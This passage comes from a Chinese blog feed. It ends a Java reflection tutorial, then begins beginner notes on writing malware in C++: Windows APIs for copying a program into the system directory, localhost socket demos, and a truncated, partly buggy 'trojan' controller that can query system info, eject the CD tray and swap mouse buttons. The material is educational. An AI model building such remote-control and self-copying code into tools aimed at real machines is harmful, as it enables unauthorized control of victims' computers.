class="line"><span class="comment">//获取指定方法名称</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">eat</span> <span class="operator">=</span> personClass.getMethod(<span class="string">&quot;eat&quot;</span>);</span><br><span class="line"><span class="comment">//创建方法对象</span></span><br><span class="line"><span class="type">Person</span> <span class="variable">p</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line"><span class="comment">//执行方法</span></span><br><span class="line">eat.invoke(p);</span><br></pre></td></tr></table></figure><p>获取方法名称</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.out.println(func.getName());</span><br></pre></td></tr></table></figure></li><li><p>获取类名</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取类名</span></span><br><span class="line"><span class="type">String</span> <span class="variable">classname</span> <span class="operator">=</span> personClass.getName();</span><br><span class="line">System.out.println(classname);</span><br></pre></td></tr></table></figure></li></ul></li></ul><h2 id="反射案例"><a class="markdownIt-Anchor" href="#反射案例"></a> 反射案例</h2><p>案例：</p><blockquote><p>需求：一个框架，可以帮我们创建任意类的对象，并且执行任意方法</p><p>不能改变该类的任何代码，<br />创建任意对象执行任意方法</p></blockquote><p>一般方式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> LearnJunit.reflect;</span><br><span class="line"><span class="keyword">import</span> LearnJunit.domain.Person;</span><br><span class="line"><span class="comment">//假设框架类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReflectFramework</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//可以创建任意类对象，可以执行任意方法</span></span><br><span class="line">        <span class="type">Person</span> <span class="variable">p</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">        p.eat();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的框架是提前学好的，不能改变；若要使用student类，则代码会改变</p><p><strong>实现</strong></p><ul><li>配置文件</li><li>反射</li></ul><p><strong>步骤</strong></p><ol><li><p>将需要创建的对象的全类名和需要执行的方法定义在配置文件中</p><p>src中创建配置文件</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">className</span>=<span class="string">LearnJunit.domain.Person</span></span><br><span class="line"><span class="attr">methodName</span>=<span class="string">eat</span></span><br></pre></td></tr></table></figure></li><li><p>在程序中加载读取配置文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1.加载配置文件</span></span><br><span class="line"><span class="comment">//1.1创建配置对象</span></span><br><span class="line"><span class="type">Properties</span> <span class="variable">pro</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Properties</span>();</span><br><span class="line"><span class="comment">//1.2加载配置文件，转换为集合</span></span><br><span class="line"><span class="comment">//1.2.1获取class目录下配置文件</span></span><br><span class="line"><span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> ReflectFramework.class.getClassLoader();<span class="comment">//获得当前类路径</span></span><br><span class="line"><span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> classLoader.getResourceAsStream(<span class="string">&quot;config.properties&quot;</span>);<span class="comment">//读取路径下的config.properties</span></span><br><span class="line">pro.load(is);</span><br><span class="line"><span class="comment">//2.获取配置文件中定义的数据</span></span><br><span class="line"><span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> pro.getProperty(<span class="string">&quot;className&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">methodName</span> <span class="operator">=</span> pro.getProperty(<span class="string">&quot;methodName&quot;</span>);</span><br></pre></td></tr></table></figure></li><li><p>使用反射技术来加载类文件进内存，创建对象并执行方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//3.加载类进内存</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> Class.forName(className);</span><br><span class="line"><span class="comment">//4.创建对象</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> cls.newInstance();</span><br><span class="line"><span class="comment">//5.获取方法对象</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span>  cls.getMethod(methodName);</span><br><span class="line">method.invoke(obj);</span><br></pre></td></tr></table></figure></li></ol><p>完整代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> LearnJunit.reflect;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> LearnJunit.domain.Person;</span><br><span class="line"><span class="keyword">import</span> LearnJunit.domain.Student;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"><span class="keyword">import</span> java.util.stream.IntStream;</span><br><span class="line"></span><br><span class="line"><span class="comment">//假设框架类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReflectFramework</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span></span><br><span class="line">            IOException,</span><br><span class="line">            ClassNotFoundException,</span><br><span class="line">            IllegalAccessException,</span><br><span class="line">            InstantiationException,</span><br><span class="line">            InvocationTargetException,</span><br><span class="line">            NoSuchMethodException &#123;</span><br><span class="line">        <span class="comment">//可以创建任意类对象，可以执行任意方法</span></span><br><span class="line">        <span class="comment">//不能改变该类的任何代码，</span></span><br><span class="line">        <span class="comment">//创建任意对象执行任意方法</span></span><br><span class="line">                </span><br><span class="line">        <span class="comment">//1.加载配置文件</span></span><br><span class="line">        <span class="comment">//1.1创建配置对象</span></span><br><span class="line">        <span class="type">Properties</span> <span class="variable">pro</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Properties</span>();</span><br><span class="line">        <span class="comment">//1.2加载配置文件，转换为集合</span></span><br><span class="line">        <span class="comment">//1.2.1获取class目录下配置文件</span></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> ReflectFramework.class.getClassLoader();</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> classLoader.getResourceAsStream(<span class="string">&quot;config.properties&quot;</span>);</span><br><span class="line">        pro.load(is);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.获取配置文件中定义的数据</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> pro.getProperty(<span class="string">&quot;className&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">methodName</span> <span class="operator">=</span> pro.getProperty(<span class="string">&quot;methodName&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//3.加载类进内存</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> Class.forName(className);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//4.创建对象</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> cls.newInstance();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//5.获取方法对象</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span>  cls.getMethod(methodName);</span><br><span class="line">        method.invoke(obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样只需要修改配置文件就可以了</p><p><img src="https://img.joe1sn.top/uploads/big/d2852d08ba40968840c750246f82618d.png" alt="image-20220316204511093" /></p><p><img src="https://img.joe1sn.top/uploads/big/ab4ce8150d031bd095f52c6865fcdf8e.png" alt="image-20220316204553895" /></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;junit单元测试与反射&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#junit单元测试与反射&quot;&gt;&lt;/a&gt; Junit单元测试与反射&lt;/h1&gt;
&lt;p&gt;黑盒-白盒&lt;/p&gt;</summary>
    
    
    
    <category term="notes" scheme="https://joe1sn.eu.org/categories/notes/"/>
    
    <category term="java" scheme="https://joe1sn.eu.org/categories/notes/java/"/>
    
    
    <category term="Java" scheme="https://joe1sn.eu.org/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>C++恶意软件入门笔记</title>
    <link href="https://joe1sn.eu.org/2021/03/30/Maleware/"/>
    <id>https://joe1sn.eu.org/2021/03/30/Maleware/</id>
    <published>2021-03-30T03:01:00.000Z</published>
    <updated>2022-09-20T08:41:07.261Z</updated>
    
    <content type="html"><![CDATA[<h1 id="c恶意软件入门笔记"><a class="markdownIt-Anchor" href="#c恶意软件入门笔记"></a> C++恶意软件入门笔记</h1><span id="more"></span><h2 id="简单的windows-api"><a class="markdownIt-Anchor" href="#简单的windows-api"></a> 简单的Windows API</h2><ul><li><p>复制自身到Windows目录</p><ul><li>1-1.获得程序自生API <code>DWORD GetModuleFileName</code></li><li>1-2.获得windows目录 <code>UINT GetWindowsDirectory</code></li><li>1-3.拷贝文件 <code>BOOL CopyFile</code></li></ul></li><li><p>获得系统基本参数</p><ul><li><p>2-1.获得操作系统版本 <code>BOOL GetVersionEx</code></p><ul><li><pre class="highlight"><code class="cpp"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_OSVERSIONINFOA</span> &#123;         DWORD dwOSVersionInfoSize;         DWORD dwMajorVersion;         DWORD dwMinorVersion;         DWORD dwBuildNumber;         DWORD dwPlatformId;         CHAR   szCSDVersion[<span class="number">128</span>];     <span class="comment">// Maintenance string for PSS usage</span>     &#125; OSVERSIONINFOA, * POSVERSIONINFOA, * LPOSVERSIONINFOA;&lt;!--code￼<span class="number">0</span>--&gt;</code></pre></li></ul></li></ul></li></ul><h2 id="tcpip连接木马"><a class="markdownIt-Anchor" href="#tcpip连接木马"></a> TCP//IP连接木马</h2><h3 id="简单的tcpip测试"><a class="markdownIt-Anchor" href="#简单的tcpip测试"></a> 简单的TCP/IP测试</h3><p><strong>server</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Winsock2.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment (lib, <span class="string">&quot;ws2_32&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="comment">//链接dll</span></span><br><span class="line"><span class="comment">// 使用该函数来初始化ws2_32.dll</span></span><br><span class="line"><span class="comment">//int WSAStartup</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//释放Dll</span></span><br><span class="line"><span class="comment">// int WSACleanuo(void)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//创建的套接字</span></span><br><span class="line"><span class="comment">// SOCKET socket</span></span><br><span class="line"><span class="comment">// (WSAAPI* LPFN_SOCKET)(</span></span><br><span class="line"><span class="comment">//    _In_ int af,//通讯协议簇</span></span><br><span class="line"><span class="comment">//    _In_ int type,//要创建的套接字类型</span></span><br><span class="line"><span class="comment">//    _In_ int protocol //指定程序所用的通讯协议</span></span><br><span class="line"><span class="comment">//    );</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//关闭套接字</span></span><br><span class="line"><span class="comment">// closesocket</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//绑定IP和端口</span></span><br><span class="line"><span class="comment">// int bind (SOCKET s, socketaddr, int namelen)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//WSAStartup-&gt;socket-&gt;bind-&gt;listen-&gt;accept-&gt;send/recv-&gt;closesocket-&gt;WSACleanup</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//1.初始化ws2_32.dll</span></span><br><span class="line">WSADATA wsaData;</span><br><span class="line"><span class="built_in">WSAStartup</span>(<span class="built_in">MAKEWORD</span>(<span class="number">2</span>,<span class="number">2</span>), &amp;wsaData);</span><br><span class="line"></span><br><span class="line"><span class="comment">//2.创建socket套接字</span></span><br><span class="line"><span class="comment">//                通讯协议簇  套接字类型    通讯协议</span></span><br><span class="line">SOCKET s = <span class="built_in">socket</span>(PF_INET, SOCK_STREAM, IPPROTO_TCP); <span class="comment">//socket对象 s</span></span><br><span class="line">sockaddr_in sockaddr;  <span class="comment">//socket 等待对象sockaddr</span></span><br><span class="line">sockaddr.sin_family = PF_INET;</span><br><span class="line">sockaddr.sin_addr.S_un.S_addr = <span class="built_in">inet_addr</span>(<span class="string">&quot;127.0.0.1&quot;</span>);<span class="comment">//点地址</span></span><br><span class="line">sockaddr.sin_port = <span class="built_in">htons</span>(<span class="number">1000</span>); <span class="comment">//设置端口</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//3.绑定ip和端口</span></span><br><span class="line"><span class="built_in">bind</span>(s, (SOCKADDR*)&amp;sockaddr, <span class="built_in">sizeof</span>(SOCKADDR)); <span class="comment">//将socket s 设置为socketaddr类型</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//4.监听</span></span><br><span class="line"><span class="built_in">listen</span>(s, <span class="number">1</span>);</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;Start Listenning\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//4.等待连接</span></span><br><span class="line">SOCKADDR clientAddr;</span><br><span class="line"><span class="type">int</span> nSize = <span class="built_in">sizeof</span>(SOCKADDR);</span><br><span class="line">SOCKET clientSock;</span><br><span class="line">clientSock = <span class="built_in">accept</span>(s, (SOCKADDR*)&amp;clientAddr, &amp;nSize);<span class="comment">//创建连接对象</span></span><br><span class="line">cout &lt;&lt; <span class="string">&quot;Client is on!\n&quot;</span>;</span><br><span class="line"><span class="comment">//5.recv || send</span></span><br><span class="line"><span class="type">char</span> msg[] = <span class="string">&quot;hello from server\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">send</span>(clientSock, msg, <span class="built_in">strlen</span>(msg)+<span class="built_in">sizeof</span>(<span class="type">char</span>), <span class="literal">NULL</span>);</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;Sending Message\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//6.断开Socket</span></span><br><span class="line"><span class="built_in">closesocket</span>(clientSock);</span><br><span class="line"><span class="built_in">closesocket</span>(s);</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;Connection close\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//7.释放ws2_32库</span></span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;Resorces clean\n&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>client</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winsock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment (lib,<span class="string">&quot;ws2_32&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="comment">//WSAstartup-&gt;socket-&gt;connect-&gt;recv/send-&gt;closesocket-&gt;WSACleanup</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//1.初始化DLL</span></span><br><span class="line">    WSADATA wsaData;</span><br><span class="line">    <span class="built_in">WSAStartup</span>(<span class="built_in">MAKEWORD</span>(<span class="number">2</span>,<span class="number">2</span>),&amp;wsaData);</span><br><span class="line"></span><br><span class="line"><span class="comment">//2.创建Socket链接对象</span></span><br><span class="line">SOCKET s = <span class="built_in">socket</span>(PF_INET, SOCK_STREAM, IPPROTO_TCP);</span><br><span class="line">sockaddr_in sockaddr;</span><br><span class="line">sockaddr.sin_family = PF_INET;</span><br><span class="line">sockaddr.sin_addr.S_un.S_addr = <span class="built_in">inet_addr</span>(<span class="string">&quot;127.0.0.1&quot;</span>);</span><br><span class="line">sockaddr.sin_port = <span class="built_in">htons</span>(<span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//3.连接到server</span></span><br><span class="line"><span class="built_in">connect</span>(s, (SOCKADDR *) &amp;sockaddr, <span class="built_in">sizeof</span>(SOCKADDR));</span><br><span class="line"></span><br><span class="line"><span class="comment">//4.设置数据缓冲区</span></span><br><span class="line"><span class="type">char</span> szBuffer[MAXBYTE];</span><br><span class="line"><span class="built_in">recv</span>(s, szBuffer, MAXBYTE, <span class="literal">NULL</span>);</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;This is msg from server\n&quot;</span>;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; szBuffer;</span><br><span class="line"></span><br><span class="line"><span class="comment">//5.关闭socket</span></span><br><span class="line"><span class="built_in">closesocket</span>(s);</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="simpletcptorjan"><a class="markdownIt-Anchor" href="#simpletcptorjan"></a> SimpleTCPTorjan</h3><p><strong>server</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winsock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment (lib, <span class="string">&quot;ws2_32&quot;</span>)</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MaxBuf = <span class="number">0x50</span>;</span><br><span class="line"><span class="comment">//1.完成功能命令的发送</span></span><br><span class="line"><span class="comment">//2.可以查看远程主机的相关信息，以及复制自身到可执行目录</span></span><br><span class="line"><span class="comment">//3.打开/关闭光驱</span></span><br><span class="line"><span class="comment">//4.交换和恢复鼠标左右键</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//宏定义帮助菜单</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HELP <span class="string">&quot;help - Show Help Menu\n&quot;</span> \</span></span><br><span class="line"><span class="meta">             <span class="string">&quot;getsysinfo - Get System Info\n&quot;</span> \</span></span><br><span class="line"><span class="meta">             <span class="string">&quot;open - Open The CDRom\n&quot;</span> \</span></span><br><span class="line"><span class="meta">             <span class="string">&quot;close - Close The CSRom\n&quot;</span> \</span></span><br><span class="line"><span class="meta">             <span class="string">&quot;swap - Swap Mouse Button\n&quot;</span> \</span></span><br><span class="line"><span class="meta">             <span class="string">&quot;restore - Restore Mouse Button\n&quot;</span> \</span></span><br><span class="line"><span class="meta">             <span class="string">&quot;exit - Quit Shell\n&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//1.初始化DLL</span></span><br><span class="line">    WSADATA wsaData;</span><br><span class="line">    <span class="built_in">WSAStartup</span>(<span class="built_in">MAKEWORD</span>(<span class="number">2</span>, <span class="number">2</span>), &amp;wsaData);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//2.创建Socket链接对象</span></span><br><span class="line">    SOCKET s = <span class="built_in">socket</span>(PF_INET, SOCK_STREAM, IPPROTO_TCP);</span><br><span class="line">    sockaddr_in sockaddr;</span><br><span class="line">    sockaddr.sin_family = PF_INET;</span><br><span class="line">    sockaddr.sin_addr.S_un.S_addr = <span class="built_in">inet_addr</span>(<span class="string">&quot;127.0.0.1&quot;</span>);</span><br><span class="line">    sockaddr.sin_port = <span class="built_in">htons</span>(<span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//3.绑定ip和端口</span></span><br><span class="line">    <span class="built_in">bind</span>(s, (SOCKADDR*)&amp;sockaddr, <span class="built_in">sizeof</span>(SOCKADDR)); <span class="comment">//将socket s 设置为socketaddr类型</span></span><br><span class="line">    <span class="built_in">listen</span>(s, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//4.等待连接</span></span><br><span class="line">    SOCKADDR clientAddr;</span><br><span class="line">    <span class="type">int</span> nSize = <span class="built_in">sizeof</span>(SOCKADDR);</span><br><span class="line">    SOCKET clientSock;</span><br><span class="line">    clientSock = <span class="built_in">accept</span>(s, (SOCKADDR*)&amp;clientAddr, &amp;nSize);<span class="comment">//创建连接对象</span></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Client is on!\n&quot;</span>;</span><br><span class="line">    <span class="comment">//开始监听</span></span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> CMD[MaxBuf];</span><br><span class="line">    <span class="type">char</span> recver[MaxBuf];</span><br><span class="line">    <span class="built_in">memset</span>(CMD, <span class="number">0</span>, MaxBuf);</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        cin &gt;&gt; CMD;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(CMD, <span class="string">&quot;help&quot;</span>))</span><br><span class="line">            cout &lt;&lt; HELP &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(CMD, <span class="string">&quot;getsysinfo&quot;</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">send</span>(clientSock, CMD, <span class="built_in">strlen</span>(CMD) + <span class="built_in">sizeof</span>(<span class="type">char</span>), <span class="literal">NULL</span>);</span><br><span class="line">            <span class="type">char</span> temp[MaxBuf];</span><br><span class="line">            <span class="built_in">memset</span>(temp, <span class="number">0</span>, MaxBuf);</span><br><span class="line">            <span class="built_in">recv</span>(s, temp, <span class="built_in">strlen</span>(temp) + <span class="built_in">sizeof</span>(<span class="type">char</span>), <span class="literal">NULL</span>);</span><br><span class="line">            <span class="built_in">memset</span>(temp, <span class="number">0</span>, MaxBuf);</span><br><span class="line">            <span class="built_in">recv</span>(s, temp, <span class="built_in">strlen</span>(temp) + <span class="built_in">sizeof</span>(<span class="type">char</span>), <span class="literal">NULL</span>);</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;recved?\n&quot;</span>;</span><br><span class="line">            cout &lt;&lt; temp &lt;&lt;endl;</span><br><span class="line">        &#125;</span><br><span class="line">        <span 